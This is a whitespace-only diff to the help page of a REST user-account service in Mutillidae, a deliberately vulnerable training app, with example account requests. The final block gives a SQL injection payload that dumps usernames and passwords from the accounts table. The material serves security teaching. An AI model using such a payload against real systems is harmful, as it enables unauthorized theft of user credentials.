@@ -126,11 +126,11 @@
 					<p><strong>Optional Parameter:</strong> <code>signature</code> (User's signature)</p>
 					<strong>Example:</strong><br />
 					<pre>
-					POST /webservices/rest/ws-user-account.php HTTP/1.1
-					Host: mutillidae.localhost
-					Content-Type: application/x-www-form-urlencoded
+POST /webservices/rest/ws-user-account.php HTTP/1.1
+Host: mutillidae.localhost
+Content-Type: application/x-www-form-urlencoded
 
-					username=john&password=pass123&firstname=John&lastname=Doe&signature=JDoe
+username=john&password=pass123&firstname=John&lastname=Doe&signature=JDoe
 					</pre>
 
 					<hr />
@@ -141,11 +141,11 @@
 					<p>If the account exists, it will be updated. If not, a new account will be created.</p>
 					<strong>Example:</strong><br />
 					<pre>
-					PUT /webservices/rest/ws-user-account.php HTTP/1.1
-					Host: mutillidae.localhost
-					Content-Type: application/x-www-form-urlencoded
+PUT /webservices/rest/ws-user-account.php HTTP/1.1
+Host: mutillidae.localhost
+Content-Type: application/x-www-form-urlencoded
 
-					username=john&password=newpass123&firstname=John&lastname=Doe&signature=JDoeUpdated
+username=john&password=newpass123&firstname=John&lastname=Doe&signature=JDoeUpdated
 					</pre>
 
 					<hr />
@@ -159,11 +159,11 @@
 					</ul>
 					<strong>Example:</strong><br />
 					<pre>
-					DELETE /webservices/rest/ws-user-account.php HTTP/1.1
-					Host: mutillidae.localhost
-					Content-Type: application/x-www-form-urlencoded
+DELETE /webservices/rest/ws-user-account.php HTTP/1.1
+Host: mutillidae.localhost
+Content-Type: application/x-www-form-urlencoded
 
-					username=john&password=newpass123
+username=john&password=newpass123
 					</pre>
 
 					<hr />
@@ -171,8 +171,9 @@
 					<h4>Example Exploits (SQL Injection)</h4>
 					<p>This service is vulnerable to SQL injection at security level 0. Example:</p>
 					<pre>
-					GET /webservices/rest/ws-user-account.php?username=jeremy'+union+select+concat('The+password+for+',username,'+is+',password),mysignature+from+accounts+-- HTTP/1.1
-					Host: mutillidae.localhost
+GET /webservices/rest/ws-user-account.php?username=jeremy'+union+select+concat('The+password+for+',username,'+is+',password),mysignature+from+accounts+-- HTTP/1.1
+Host: mutillidae.localhost
+
 					</pre>
 
 					";
